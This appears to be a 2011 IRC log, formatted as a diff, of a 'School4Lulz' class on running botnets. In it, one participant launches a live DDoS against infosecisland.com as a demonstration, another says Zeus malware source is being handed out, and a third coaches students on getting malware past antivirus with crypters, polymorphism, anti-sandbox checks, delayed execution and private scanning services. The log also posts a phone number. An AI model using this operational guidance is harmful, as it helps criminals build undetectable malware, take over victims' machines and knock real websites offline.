@@ -1,0 +1,871 @@
+Advanced Botnet Structure and Theory (by Fox, xochipilli, Jester, and D0ct0r)
+
+**** BEGIN LOGGING AT Fri Jun 24 21:51:26 2011
+
+Jun 24 21:51:27 *    Fox gives channel half-operator status to d0ct0r
+Jun 24 21:51:33 <d0ct0r>    yay
+Jun 24 21:51:58 <Fox>    Now we’re starting off with whats called the ‘botcloud’
+Jun 24 21:52:09 <Fox>    d0ct0r you want to start off on this new little phenomenon?
+Jun 24 21:52:35 <d0ct0r>    Ok let us begin
+Jun 24 21:52:48 <d0ct0r>    Ok the person who makes the botnet
+Jun 24 21:52:53 <d0ct0r>    is called the bot herder
+Jun 24 21:53:06 <d0ct0r>    He is able to control the botnet from his own computer
+Jun 24 21:53:14 <d0ct0r>    usually, in my case, through an irc.
+Jun 24 21:53:36 <d0ct0r>    In order to create the botnet
+Jun 24 21:54:01 <d0ct0r>    the user must compromise a server or computer with a Trojan
+Jun 24 21:54:31 <d0ct0r>    There are different types
+Jun 24 21:54:32 <d0ct0r>    of botnets
+Jun 24 21:54:37 <d0ct0r>    in organization
+Jun 24 21:54:44 <d0ct0r>    A “circle” botnet
+Jun 24 21:54:52 <d0ct0r>    a “Muti-server”
+Jun 24 21:55:02 <d0ct0r>    a “Family” botnet
+Jun 24 21:55:11 <d0ct0r>    and then of course there is a no organization
+Jun 24 21:55:12 <d0ct0r>    b
+Jun 24 21:55:13 <d0ct0r>    botnet
+Jun 24 21:55:36 <d0ct0r>    Now with the botnet
+Jun 24 21:55:54 <d0ct0r>    Once your computer or server is infected with it, you will usually not be able to tell
+Jun 24 21:56:29 <d0ct0r>    Then the bot or trojan from your computer logs into a server
+Jun 24 21:56:39 <d0ct0r>    usually, as I stated before, an irc server
+Jun 24 21:57:00 <d0ct0r>    Then from there the botherder, if a whitehat hacker usually DoS’es
+Jun 24 21:57:16 <d0ct0r>    If a blackhat hacker, usually “rents-out” the botnet to a company to spam messages
+Jun 24 21:57:27 <d0ct0r>    This is why you have viagra advertisements on your computer
+Jun 24 21:57:56 <d0ct0r>    And this is about it.
+Jun 24 21:58:02 <d0ct0r>    Any questions?
+Jun 24 21:58:34 <Omega`>    -m so people can reply
+Jun 24 21:58:50 <d0ct0r>    Oh thats right Fox you there?
+Jun 24 21:58:51 *    jester sets mode -m #school4lulz
+Jun 24 21:58:53 <LulzLizard[925]>    For the spam messages, who is in charge of generating email accounts etc? the company or the botnet herder?
+Jun 24 21:59:01 <RedStar>    no thanks
+Jun 24 21:59:09 <jester>    one thing to add
+Jun 24 21:59:14 <Fox>    Yeah
+Jun 24 21:59:14 <d0ct0r>    It varies lulzlizard
+Jun 24 21:59:15 <Fox>    I’m here
+Jun 24 21:59:17 <RedStar>    nice going
+Jun 24 21:59:17 <jester>    IRC is where the first bots came to be
+Jun 24 21:59:22 <Fox>    Whoaaaaaa
+Jun 24 21:59:26 <jester>    sticking with IRC in 2011 is shooting yourself in the foot
+Jun 24 21:59:31 <Fox>    k
+Jun 24 21:59:31 <Fox>    sec
+Jun 24 21:59:33 <Fox>    break
+Jun 24 21:59:34 <Fox>    lol
+Jun 24 21:59:35 <jester>    k
+Jun 24 21:59:35 <pleb>    explanation of the different types maybe?
+Jun 24 21:59:42 <allmybase>    what if irc protocol is blocked
+Jun 24 21:59:42 <d0ct0r>    It works fine jester most anon use it.
+Jun 24 21:59:44 <jester>    d0ct0r asked for questions
+Jun 24 21:59:51 <d0ct0r>    Ok
+Jun 24 21:59:54 <sirizbiz>    yup explanation of types pl0x 
+Jun 24 21:59:54 <jester>    d0ct0r i didnt say it didnt work
+Jun 24 21:59:59 <Faks>    why not most of troajns can be easliy tracked down like i do testing netstat and checking msconfig and startup in regedit is there a way to hide them from such paranoids freaks like me aye ?
+Jun 24 22:00:01 <jester>    i said its unsafe
+Jun 24 22:00:06 <jester>    easy to eavesdrop
+Jun 24 22:00:09 <jester>    easy to reverse
+Jun 24 22:00:11 <jester>    easy to take over
+Jun 24 22:00:15 <Infinite>    were is the best pace nowdays then?
+Jun 24 22:00:19 <jester>    you have any idea how many nets ive jacked?
+Jun 24 22:00:20 <Infinite>    place*
+Jun 24 22:00:22 <d0ct0r>    True But I have sub botnets within my botnet
+Jun 24 22:00:22 <jester>    spoiler: they were all irc nets
+Jun 24 22:00:30 *    jester sets mode +m #school4lulz
+Jun 24 22:00:33 <d0ct0r>    Jester “whispers: I began my botnet by jacking it”
+Jun 24 22:00:43 <jester>    now if you are new to nets and you wanna fool around with IRC feel free
+Jun 24 22:00:49 <jester>    but if you get serious and want a large, secure net
+Jun 24 22:00:54 <jester>    another protocol is preferable
+Jun 24 22:00:58 <jester>    imo
+Jun 24 22:01:12 <d0ct0r>    Jester but the best way to rent out, or in my case let other people use it
+Jun 24 22:01:13 <jester>    the first nets were modified mirc scripts and shit
+Jun 24 22:01:14 <d0ct0r>    is with an irc
+Jun 24 22:01:19 <jester>    no not at all
+Jun 24 22:01:24 <d0ct0r>    It was telnet jester
+Jun 24 22:01:33 <d0ct0r>    Ok so the different organizations
+Jun 24 22:01:43 <jester>    the first widespread nets that started the whole scene were mirc shits
+Jun 24 22:01:44 <jester>    lol.
+Jun 24 22:01:46 <jester>    GTBot
+Jun 24 22:01:48 <jester>    frozen bot
+Jun 24 22:01:49 <jester>    etc
+Jun 24 22:01:58 <jester>    now to address your point about renting it out
+Jun 24 22:02:09 <jester>    i could compile a custom commander right now that could only control 1000 bots
+Jun 24 22:02:17 <jester>    connect to the same master server
+Jun 24 22:02:25 <jester>    and be completely secure
+Jun 24 22:02:43 <jester>    so.. yeah.
+Jun 24 22:03:15 <d0ct0r>    Ok so let us begin with organization
+Jun 24 22:03:28 <d0ct0r>    So I personally use a “family” organization
+Jun 24 22:03:46 <d0ct0r>    So basically it has one big server and various subservers
+Jun 24 22:04:07 <d0ct0r>    Each connect “upward” until
+Jun 24 22:04:14 <d0ct0r>    it arrives at the server
+Jun 24 22:04:34 <d0ct0r>    This eliminates the ease of feds or others hijacking or killing your botnet
+Jun 24 22:04:43 <Fox>    d0ct0r
+Jun 24 22:04:43 <d0ct0r>    so if they kill one subserver
+Jun 24 22:04:45 <Fox>    Correction
+Jun 24 22:04:49 <d0ct0r>    yes?
+Jun 24 22:04:49 <Fox>    Compartmentalizes.
+Jun 24 22:05:11 <d0ct0r>    Oh sorry, my terminology was incorrect.
+Jun 24 22:05:40 <d0ct0r>    Another advantage in a “family” botnet organization is speed.
+Jun 24 22:05:53 <d0ct0r>    you let them all connect, and then you can
+Jun 24 22:05:59 <d0ct0r>    attack the one target
+Jun 24 22:06:03 *    \etc\passwd is now known as RedStar
+Jun 24 22:06:10 <d0ct0r>    causing a DoS efficient and effective
+Jun 24 22:06:22 <jester>    once again, to me this seems like a sloppy workaround to using something that avoids irc alltogether, and simply has a different protocol/identification method to avoid anyone seeing ANY information about your net
+Jun 24 22:06:28 <jester>    for example
+Jun 24 22:06:44 <jester>    IRC: bot connects, and unless its a heavily modified ircd they can see all the other bots
+Jun 24 22:06:45 <Fox>    jester
+Jun 24 22:06:51 <jester>    and they see the commander connect and identify
+Jun 24 22:06:52 <Fox>    IRC is a basepoint to these kids.
+Jun 24 22:06:57 <d0ct0r>    ^
+Jun 24 22:06:57 <Fox>    We’re gonna get to http 
+Jun 24 22:07:00 <jester>    i understand that
+Jun 24 22:07:02 <d0ct0r>    mhm
+Jun 24 22:07:02 <jester>    im trying to explain
+Jun 24 22:07:05 <jester>    why its insecure
+Jun 24 22:07:11 <jester>    because all users are equal
+Jun 24 22:07:13 <jester>    bots and commanders
+Jun 24 22:07:18 <Fox>    Let d0ct0r get through the IRC bump
+Jun 24 22:07:21 <jester>    can see eachother, etc, makes it very easy to take over
+Jun 24 22:07:22 <jester>    ok fuck it
+Jun 24 22:07:24 <jester>    bai
+Jun 24 22:07:29 <Fox>    IE:
+Jun 24 22:07:39 <Fox>    Subject -> Rebuttal
+Jun 24 22:07:42 <Fox>    follow.
+Jun 24 22:07:42 <d0ct0r>    Ok I will show you an example
+Jun 24 22:07:44 <d0ct0r>    of speed
+Jun 24 22:07:49 <d0ct0r>    of the speed*
+Jun 24 22:07:51 <d0ct0r>    of a botnet.
+Jun 24 22:07:57 <d0ct0r>    So a “family” botnet
+Jun 24 22:08:05 <d0ct0r>    So currently I have seen one target
+Jun 24 22:08:14 <d0ct0r>    who has been bothering lulzsec, and other hackers
+Jun 24 22:08:15 <d0ct0r>    www.infosecisland.com
+Jun 24 22:08:33 <d0ct0r>    So now
+Jun 24 22:08:39 <d0ct0r>    I am prepairing by botnet
+Jun 24 22:09:32 <d0ct0r>    and now
+Jun 24 22:09:37 <d0ct0r>    !check www.infosecisland.com
+Jun 24 22:09:44 <d0ct0r>    Oh we don’t have that here
+Jun 24 22:09:44 <d0ct0r>    lol
+Jun 24 22:09:54 <d0ct0r>    Do !invite evilworks Fox
+Jun 24 22:09:56 <vtm>    it’s dead
+Jun 24 22:09:56 *    #school4lulz :Cannot send to channel (+m)
+Jun 24 22:09:59 <d0ct0r>    !invite evilworks
+Jun 24 22:10:03 <jester>    TANGO DOWN
+Jun 24 22:10:09 <d0ct0r>    exactly
+Jun 24 22:10:21 <d0ct0r>    So everyone check for themselves
+Jun 24 22:10:54 <d0ct0r>    My speed is approximantly 6 seconds to take down the target
+Jun 24 22:10:58 <d0ct0r>    http://www.isup.me/infosecisland.com
+Jun 24 22:11:19 <d0ct0r>    Ok so now, I will withdraw my botnet from attack
+Jun 24 22:11:26 <d0ct0r>    which will cease with efficiently.
+Jun 24 22:11:37 <d0ct0r>    Now it should be up
+Jun 24 22:11:44 <d0ct0r>    And tada
+Jun 24 22:11:46 <d0ct0r>    it is up
+Jun 24 22:11:52 <d0ct0r>    http://www.isup.me/infosecisland.com
+Jun 24 22:12:02 <d0ct0r>    That is the power of a botnet.
+Jun 24 22:12:10 <Fox>    On switch
+Jun 24 22:12:12 <Fox>    off switch
+Jun 24 22:12:16 <d0ct0r>    Exactly
+Jun 24 22:12:21 <Topiary>    what type of flood was that?
+Jun 24 22:12:25 >d0ct0r<    pipe of infosecisland?
+Jun 24 22:12:35 <jester>    dickDoS
+Jun 24 22:12:39 <d0ct0r>    lol
+Jun 24 22:12:40 <d0ct0r>    Yea
+Jun 24 22:12:41 <jester>    penises via packets
+Jun 24 22:12:52 <Fox>    See type of flood class from prior talk
+Jun 24 22:12:58 <Fox>    That addresses all types of floods
+Jun 24 22:13:05 *    Fox gives channel operator status to xochipilli
+Jun 24 22:13:14 <Topiary>    did you engage in http cannons or perhaps some SYN ammunition from your battleship with that last one, d0ct0r?
+Jun 24 22:13:18 <Fox>    xochipilli will be speaking on executable encryption.
+Jun 24 22:13:25 <xochipilli>    :3
+Jun 24 22:13:26 <Fox>    In a few
+Jun 24 22:13:26 <d0ct0r>    http cannons
+Jun 24 22:13:38 >Fox<    what is the bandwith needed to screw infosec island, how to gather info about it?
+Jun 24 22:13:46 <d0ct0r>    That’s the power of a “family” organized botnet
+Jun 24 22:13:59 <Fox>    d0ct0r
+Jun 24 22:14:02 <Fox>    estimated bandwidth?
+Jun 24 22:14:10 <d0ct0r>    mmm no idea
+Jun 24 22:14:18 <d0ct0r>    Don’t have that scripted in
+Jun 24 22:14:27 <d0ct0r>    Well it takes 6 seconds
+Jun 24 22:14:34 <Fox>    w/e
+Jun 24 22:14:35 <Fox>    moving along
+Jun 24 22:14:39 <d0ct0r>    Ok
+Jun 24 22:14:44 <Fox>    Jester is going to speak to you little niggas
+Jun 24 22:14:54 <Fox>    about how you get your net jacked, and http command and control
+Jun 24 22:14:56 <Fox>    and in the middle
+Jun 24 22:15:07 <Fox>    I have a little gift for you faggots from School4Lulz
+Jun 24 22:15:14 <d0ct0r>    lol
+Jun 24 22:15:37 <jester>    alright, so ladies when I mention that IRC isnt optimal for your advanced-botnet needs, that doesnt always mean http either
+Jun 24 22:15:48 <jester>    now there are very successful http bots, as you’ll see soon
+Jun 24 22:16:04 <jester>    but with a little coding expertise you can make your own protocol, your own listening master, commander, and bots
+Jun 24 22:16:27 <jester>    or cut out the master and turn it into a peer-to-peer system
+Jun 24 22:16:45 <jester>    either way, the reason you want to avoid IRC past a certain amount is because of ease of hijacking and sniffing
+Jun 24 22:17:14 <jester>    if you sandbox an irc bot, you can easily find out what server it connects to, port, channel, nick form
+Jun 24 22:17:27 <jester>    makes it very easy for even a 14 year old to pretend to be a bot and come sit on your net and watch
+Jun 24 22:17:35 <d0ct0r>    lol
+Jun 24 22:17:40 <jester>    thats the weakness of IRC, every user is treated equal
+Jun 24 22:17:48 <jester>    now, there are heavily modified ircds, and ways to avoid this
+Jun 24 22:18:03 <jester>    but as i mentioned, in my opinion thats a sloppy way to take care of a big problem
+Jun 24 22:18:26 >jester<    what about each client has it’s rsa key to auth into a mod ircd?
+Jun 24 22:18:37 <jester>    you cut out the IRC factor, and you sandbox a bot connecting to a server passing encrypted parameters and data, thats a significant amount of reversing work to get anywhere
+Jun 24 22:19:17 <jester>    not to mention that if the C&C is set up properly, the best they can do is pretend to be a bot, because they dont have enough information to be a commander
+Jun 24 22:19:33 <jester>    cuts down on available information to whitehats/law enforcement/kids wanting to take over your shit
+Jun 24 22:19:51 <jester>    now, again, im not saying nobody here should test the waters with a good irc bot
+Jun 24 22:19:59 <jester>    they work. they have worked for years.
+Jun 24 22:20:05 <jester>    you just need to be aware of the risks.
+Jun 24 22:20:38 <jester>    now, a very popular and sucessful HTTP-based net
+Jun 24 22:20:42 <jester>    is zeus
+Jun 24 22:20:58 <jester>    everyone and their mothers in the bnet scene knows wtf zeus is
+Jun 24 22:21:02 <jester>    if you dont, today is your lucky day
+Jun 24 22:21:10 <d0ct0r>    lol
+Jun 24 22:21:22 <jester>    Fox has a surprise
+Jun 24 22:21:29 <Fox>    :3
+Jun 24 22:21:32 <Fox>    Indeed
+Jun 24 22:21:44 <xochipilli>    other issue is, irc traffic is much more suspicious
+Jun 24 22:21:45 <xochipilli>    than http traffic
+Jun 24 22:21:52 <Fox>    Moment while I prepare
+Jun 24 22:22:02 <xochipilli>    irc traffic is pretty synonomous w/ botnet control
+Jun 24 22:22:07 <xochipilli>    not many average joes use irc
+Jun 24 22:22:13 <xochipilli>    every single one of them uses a web browser
+Jun 24 22:22:26 <jester>    indeed
+Jun 24 22:23:05 <jester>    or an im client, or any other abundantly available apps that connect, but when you are non-willingly connecting to IRC its a pretty big red flag
+Jun 24 22:23:09 <d0ct0r>    How much does zeus costs now jester?
+Jun 24 22:23:11 <jester>    for the users and for their security software
+Jun 24 22:23:22 <jester>    idk I’ve never bought it
+Jun 24 22:23:36 <d0ct0r>    me neither but I hear it is like 10,000 USD
+Jun 24 22:24:08 <d0ct0r>    but the source code is leaked now
+Jun 24 22:24:12 <d0ct0r>    so no need anymore
+Jun 24 22:24:13 <d0ct0r>    
+Jun 24 22:24:19 <jester>    mhm
+Jun 24 22:24:23 <Fox>    :3
+Jun 24 22:24:23 <jester>    gotta give fox a few mins
+Jun 24 22:24:34 <Fox>    Kids
+Jun 24 22:24:42 <Fox>    the problem with getting leaked source
+Jun 24 22:24:48 <Fox>    is that it’s usually backdoored
+Jun 24 22:24:49 <Fox>    now right now
+Jun 24 22:24:59 <Fox>    you’re all about to get a nice clean copy of zeus for yourselves.
+Jun 24 22:25:15 <d0ct0r>    :O
+Jun 24 22:25:40 <Fox>    In the meantime while I’m uploading the cleaned version that xochipilli and I have prepared for you kiddies,
+Jun 24 22:25:59 <d0ct0r>    Does it come with aaall the features
+Jun 24 22:26:02 <Fox>    xochipilli is going to tell you a little about executables and how to protect before I speak
+Jun 24 22:26:02 <d0ct0r>    ?
+Jun 24 22:26:25 <xochipilli>    ah
+Jun 24 22:26:27 <xochipilli>    am i up?
+Jun 24 22:26:34 <Fox>    Yep
+Jun 24 22:26:39 <xochipilli>    im actually in the middle of fuddin a crypter
+Jun 24 22:26:39 <xochipilli>    haha
+Jun 24 22:26:43 <xochipilli>    how suiting
+Jun 24 22:26:44 <Fox>    Lol
+Jun 24 22:26:45 <xochipilli>    so yeah
+Jun 24 22:26:54 <xochipilli>    does anyone know how AV works? lets say I have a file
+Jun 24 22:26:55 <xochipilli>    like zeus
+Jun 24 22:27:03 <xochipilli>    how does an AV *know*, that its zeus
+Jun 24 22:27:03 <xochipilli>    ?
+Jun 24 22:27:04 *    xochipilli sets mode -m #school4lulz
+Jun 24 22:27:09 <jester>    signatures
+Jun 24 22:27:11 <jester>    sry spoiled
+Jun 24 22:27:12 <xochipilli>    ^
+Jun 24 22:27:14 <jester>    lol
+Jun 24 22:27:14 *    xochipilli sets mode +m #school4lulz
+Jun 24 22:27:18 <xochipilli>    exactly
+Jun 24 22:27:23 <d0ct0r>    lol You werent suppose to answer that jester 
+Jun 24 22:27:24 <xochipilli>    now, some AVs do “active protection” shit
+Jun 24 22:27:27 <xochipilli>    we’ll talk about that later
+Jun 24 22:27:32 <d0ct0r>    norton
+Jun 24 22:27:33 <xochipilli>    but yes, signatures
+Jun 24 22:27:35 <jester>    i know
+Jun 24 22:27:40 <xochipilli>    basically, what they do is, fingerprint the binary
+Jun 24 22:27:40 <jester>    i apologized for spoilt
+Jun 24 22:27:44 <xochipilli>    but looking for little pieces of code
+Jun 24 22:27:49 <xochipilli>    it could be anything
+Jun 24 22:27:50 <xochipilli>    youd be AMAZED
+Jun 24 22:27:54 <xochipilli>    the shit they detect
+Jun 24 22:28:00 <d0ct0r>    Then when it is encrypted you are safe
+Jun 24 22:28:00 <xochipilli>    and even more amazed, they dont get any cross-detections
+Jun 24 22:28:07 <xochipilli>    im getitn there 
+Jun 24 22:28:12 <d0ct0r>    lol srry
+Jun 24 22:28:18 <xochipilli>    so, unless you wanna go rewrite little parts of zeus
+Jun 24 22:28:20 <xochipilli>    that get detected
+Jun 24 22:28:29 <xochipilli>    how will u keep AVs from detecting it?
+Jun 24 22:28:33 <xochipilli>    w/ a packer/crypter
+Jun 24 22:28:38 <xochipilli>    essentially what a crypter does
+Jun 24 22:28:41 <xochipilli>    is take your bot exe
+Jun 24 22:28:49 <xochipilli>    encrypt it
+Jun 24 22:28:56 <xochipilli>    and then pack it into another exe w/ a “stub”
+Jun 24 22:29:00 <xochipilli>    which unpacks and decrypts it at run time
+Jun 24 22:29:09 <xochipilli>    depending on the method, it may “drop” a file, or decrypt straight into memory
+Jun 24 22:29:12 <xochipilli>    and run it
+Jun 24 22:29:17 <xochipilli>    the latter is obviously preferable
+Jun 24 22:29:24 <xochipilli>    but
+Jun 24 22:29:29 <xochipilli>    you cant just store a big binary blob
+Jun 24 22:29:34 <xochipilli>    of encrypted bot
+Jun 24 22:29:38 <xochipilli>    in the middle of your exe
+Jun 24 22:29:42 <xochipilli>    AVs will frown upon that
+Jun 24 22:29:53 <xochipilli>    so you usually put it into an image
+Jun 24 22:29:57 <xochipilli>    or some other kind of file
+Jun 24 22:30:16 <d0ct0r>    Then you post it on 4chan and get lots of zombie computers
+Jun 24 22:30:18 <xochipilli>    so it just looks like your program has some kind of file in it, which plenty of legitimate progrmas do
+Jun 24 22:30:21 <xochipilli>    haha
+Jun 24 22:30:22 <xochipilli>    so now
+Jun 24 22:30:24 <xochipilli>    what kind of encryption
+Jun 24 22:30:25 <xochipilli>    should u use
+Jun 24 22:30:28 <xochipilli>    can anyone tell me
+Jun 24 22:30:37 <xochipilli>    why you shouldnt write your own crypto for a crypter?
+Jun 24 22:30:39 *    xochipilli sets mode -m #school4lulz
+Jun 24 22:30:54 <xochipilli>    cmon
+Jun 24 22:30:54 <bmcd>    because aes is secure and your own crypto could be broken easily
+Jun 24 22:30:56 <VanOfTheDusk>    Cause we suck at scripting?
+Jun 24 22:30:57 <xochipilli>    jus guess at it :p
+Jun 24 22:30:58 <WeAreRevenge>    because only you can decrypt
+Jun 24 22:31:00 <xochipilli>    hahaha
+Jun 24 22:31:03 <xochipilli>    no
+Jun 24 22:31:05 <Fox>    cause your lazy
+Jun 24 22:31:05 <WeAreRevenge>    LAWL
+Jun 24 22:31:08 *    xochipilli sets mode +m #school4lulz
+Jun 24 22:31:11 <vtm>    cuz the av would frown at it
+Jun 24 22:31:12 *    #school4lulz :Cannot send to channel (+m)
+Jun 24 22:31:12 <xochipilli>    because
+Jun 24 22:31:17 <xochipilli>    its easy to detect
+Jun 24 22:31:21 <xochipilli>    if i use crypto thats used everywhere
+Jun 24 22:31:23 <xochipilli>    like DES
+Jun 24 22:31:25 <xochipilli>    they can detect my crypto
+Jun 24 22:31:31 <xochipilli>    w/o detecting tons of legitimate software
+Jun 24 22:31:41 <d0ct0r>    cant*
+Jun 24 22:31:46 <xochipilli>    ^
+Jun 24 22:31:49 <xochipilli>    if you write your own crypto routine, theyll just keep detecting it
+Jun 24 22:31:49 <xochipilli>    thank you d0ct0r
+Jun 24 22:31:53 <d0ct0r>    np
+Jun 24 22:31:53 <xochipilli>    and youll spend all your time rewriting it
+Jun 24 22:32:03 <xochipilli>    if possible, use an existing crypto package
+Jun 24 22:32:06 <xochipilli>    something legit software uses
+Jun 24 22:32:20 <xochipilli>    you want your packer to look and behave like a benign program AS MUCH AS POSSIBLE
+Jun 24 22:32:42 <xochipilli>    should i talk about polymorphism?
+Jun 24 22:32:45 <xochipilli>    or is that too much?
+Jun 24 22:32:50 <xochipilli>    should i get into the
+Jun 24 22:32:50 <xochipilli>    practical
+Jun 24 22:32:54 <jester>    hold up
+Jun 24 22:32:54 <xochipilli>    how do i take over the world w/ my botnet
+Jun 24 22:32:56 <xochipilli>    aspect of this?
+Jun 24 22:32:56 <Fox>    xochipilli
+Jun 24 22:33:00 <d0ct0r>    yea sure
+Jun 24 22:33:01 <Fox>    keep goin
+Jun 24 22:33:05 <jester>    the best possible methods in existence to avoid having your bot reversed or detected
+Jun 24 22:33:06 <Fox>    as my connection sucks dick
+Jun 24 22:33:09 <jester>    are
+Jun 24 22:33:10 <Fox>    and these kids are entertained
+Jun 24 22:33:16 <d0ct0r>    lol
+Jun 24 22:33:17 <jester>    the methods invented to protect software
+Jun 24 22:33:17 <xochipilli>    haha ok
+Jun 24 22:33:21 <xochipilli>    also
+Jun 24 22:33:23 <jester>    for example: my personal favorite is a VM
+Jun 24 22:33:23 <xochipilli>    worth noting
+Jun 24 22:33:27 <xochipilli>    good crypters will have anti-sandboxing features
+Jun 24 22:33:29 <jester>    if you have your exe run in a virtual machine
+Jun 24 22:33:46 <xochipilli>    clever AVs will actually run your binary in a sandbox, unti it unpacks your evil bot
+Jun 24 22:33:49 <xochipilli>    and THEN
+Jun 24 22:33:50 <xochipilli>    scan the bot
+Jun 24 22:34:08 <xochipilli>    so you have to do some nasty things that AV sandboxes cant “follow”
+Jun 24 22:34:13 <xochipilli>    or delay execution
+Jun 24 22:34:15 <Mutiny>    Avast asks me to run all kinds of exe’s in a sandbox. I should test this out then I suppose.
+Jun 24 22:34:22 <xochipilli>    because if it takes 2 minutes to run, the AV will just give up
+Jun 24 22:34:27 <jester>    depending on the time spent and the randomization, its nearly impossible to reverse
+Jun 24 22:34:27 <jester>    well xochipilli
+Jun 24 22:34:27 <jester>    VM defeats all of that
+Jun 24 22:34:29 <jester>    even in memory its running in a container
+Jun 24 22:34:32 <jester>    with modified opcodes
+Jun 24 22:34:34 <jester>    nopsleds randomly
+Jun 24 22:34:43 <xochipilli>    oh yeah
+Jun 24 22:34:55 <xochipilli>    ive never worked w/ something like that
+Jun 24 22:34:56 <jester>    i have a friend who spent the last 3 years learning how to create a virtual machine and has been writing a program
+Jun 24 22:34:59 <xochipilli>    tho ive heard about em
+Jun 24 22:35:01 <jester>    its a real beauty
+Jun 24 22:35:05 <Omega`>    (and, writing your own crypto code is almost *always* a bad idea)
+Jun 24 22:35:07 <xochipilli>    i bet
+Jun 24 22:35:13 <xochipilli>    ^
+Jun 24 22:35:18 <xochipilli>    if you arent a crypto pro
+Jun 24 22:35:20 <xochipilli>    dont bother
+Jun 24 22:35:23 <xochipilli>    youll just hurt yourself
+Jun 24 22:35:26 <jester>    randomly adds jmp tables
+Jun 24 22:35:32 <jester>    morphs pushes
+Jun 24 22:35:37 <d0ct0r>    oh thats nice
+Jun 24 22:35:38 <jester>    VM is amazing
+Jun 24 22:35:39 <Omega`>    Look at Sony and the PS3, just pathetic.
+Jun 24 22:35:44 <xochipilli>    haha
+Jun 24 22:35:47 <d0ct0r>    lol
+Jun 24 22:35:47 <jester>    lmao
+Jun 24 22:35:47 <xochipilli>    either way
+Jun 24 22:35:51 <xochipilli>    as cool as VMs are
+Jun 24 22:35:53 <xochipilli>    im guna move on :p
+Jun 24 22:36:00 <jester>    yeah
+Jun 24 22:36:04 <xochipilli>    so, few more things
+Jun 24 22:36:07 <xochipilli>    polymorphism
+Jun 24 22:36:15 <xochipilli>    you want every crypt to be unique
+Jun 24 22:36:18 <xochipilli>    you can do this a few ways
+Jun 24 22:36:21 <xochipilli>    tweaking compiler options
+Jun 24 22:36:24 <xochipilli>    or even using a different compiler
+Jun 24 22:36:27 <xochipilli>    polymorphic code
+Jun 24 22:36:40 <xochipilli>    adding junk code
+Jun 24 22:36:43 <xochipilli>    rearrnaging code
+Jun 24 22:36:51 <xochipilli>    some of this can be done programatically
+Jun 24 22:36:54 <xochipilli>    another thing is string crypto
+Jun 24 22:37:04 <xochipilli>    strings are an easy thing for them to detect, if u have a unique string in your program
+Jun 24 22:37:11 <xochipilli>    so you have to write a routine to generate strings on demand
+Jun 24 22:37:21 <xochipilli>    lol ^
+Jun 24 22:37:24 <xochipilli>    there are inifite ways you can do this
+Jun 24 22:37:28 <xochipilli>    just somethin to chew on
+Jun 24 22:37:32 <xochipilli>    fun little project
+Jun 24 22:37:42 <xochipilli>    so
+Jun 24 22:37:43 <xochipilli>    more practically
+Jun 24 22:37:47 <xochipilli>    youve bought
+Jun 24 22:37:49 <xochipilli>    or written a crypter
+Jun 24 22:37:51 <xochipilli>    NOW WHAT?
+Jun 24 22:37:58 <xochipilli>    well you crypt your bin, test it out
+Jun 24 22:38:03 <xochipilli>    there are a few sites out there
+Jun 24 22:38:10 <xochipilli>    that will scan your bin w/ a whole array of AVs
+Jun 24 22:38:13 <xochipilli>    so you can see what detects it
+Jun 24 22:38:15 <d0ct0r>    google.com is one
+Jun 24 22:38:23 <xochipilli>    scan4you.org
+Jun 24 22:38:26 <xochipilli>    is the most well used
+Jun 24 22:38:28 <xochipilli>    .net also works
+Jun 24 22:38:29 <xochipilli>    i believe
+Jun 24 22:38:32 <xochipilli>    they get ddosed all the time
+Jun 24 22:38:33 <d0ct0r>    Or you can use your own antivirus to detect it
+Jun 24 22:38:37 <xochipilli>    so they jump from domain to tdomain
+Jun 24 22:38:43 <xochipilli>    the advantage of something like scan4you
+Jun 24 22:38:45 <xochipilli>    over using your own AV
+Jun 24 22:38:50 <xochipilli>    is they scan your file w/ 33 different AVs
+Jun 24 22:38:52 <xochipilli>    34 now actually
+Jun 24 22:38:55 <d0ct0r>    damn
+Jun 24 22:38:58 <xochipilli>    so u can see how many and which ones detect it
+Jun 24 22:39:05 <xochipilli>    which is useful
+Jun 24 22:39:14 <xochipilli>    because most crypters will become detected after a couple days or so
+Jun 24 22:39:19 <jester>    yeah
+Jun 24 22:39:24 <xochipilli>    more or less dpeneding on how many users/nodes there are
+Jun 24 22:39:30 <jester>    depending on your cunsumer base
+Jun 24 22:39:30 <xochipilli>    AV companies get samples
+Jun 24 22:39:34 <jester>    consumer**
+Jun 24 22:39:34 <d0ct0r>    Over 9000
+Jun 24 22:39:36 <xochipilli>    make sigs
+Jun 24 22:39:42 <xochipilli>    you can avoid this
+Jun 24 22:39:44 <xochipilli>    by avoiding honeypots
+Jun 24 22:39:51 <xochipilli>    a good bot will self destruct
+Jun 24 22:39:55 <xochipilli>    if its run in a VM
+Jun 24 22:39:57 <xochipilli>    for this reason
+Jun 24 22:39:59 <xochipilli>    most honeypots are VMs
+Jun 24 22:40:07 <xochipilli>    DO NOT
+Jun 24 22:40:11 <xochipilli>    use virustotal
+Jun 24 22:40:15 <xochipilli>    someone just pmd me to mention them
+Jun 24 22:40:19 <xochipilli>    virustotal submits malware smaples
+Jun 24 22:40:20 <xochipilli>    samples*
+Jun 24 22:40:26 <d0ct0r>    ahh
+Jun 24 22:40:32 <xochipilli>    submitting someones bot to virustotal pretty much ensures it will become very detected
+Jun 24 22:40:36 <d0ct0r>    Will zeus self-destruct btw?
+Jun 24 22:40:38 <xochipilli>    if u find someones bot on your computer
+Jun 24 22:40:40 <xochipilli>    and u wanna say FUCK U
+Jun 24 22:40:42 <xochipilli>    submit it to VT
+Jun 24 22:40:44 <xochipilli>    d0ct0r: yes
+Jun 24 22:40:49 <d0ct0r>    oh cool
+Jun 24 22:41:19 <xochipilli>    so
+Jun 24 22:41:22 <xochipilli>    youve got your crypted bin
+Jun 24 22:41:22 <d0ct0r>    I may use the backdoors of my botnet to install zeus on all of them
+Jun 24 22:41:26 <xochipilli>    tested it w/ s4u
+Jun 24 22:41:34 <xochipilli>    zeus is p dope
+Jun 24 22:41:36 <xochipilli>    very minimalist
+Jun 24 22:41:39 <xochipilli>    i appreciate that
+Jun 24 22:41:47 <xochipilli>    so yeah
+Jun 24 22:41:49 <xochipilli>    any questions?
+Jun 24 22:41:50 *    xochipilli sets mode -m #school4lulz
+Jun 24 22:42:00 <VanOfTheDusk>    Yes. I have one.
+Jun 24 22:42:04 <xochipilli>    sorry if i move a little quick, its in my nature
+Jun 24 22:42:07 <xochipilli>    shoot
+Jun 24 22:42:16 <d0ct0r>    Boom headshot
+Jun 24 22:42:24 <jester>    one more thing
+Jun 24 22:42:26 <jester>     954-435-0005 – Ask for tupac
+Jun 24 22:42:27 <VanOfTheDusk>    for the newbie, what is the risk involved with getting a botnet on your pc?
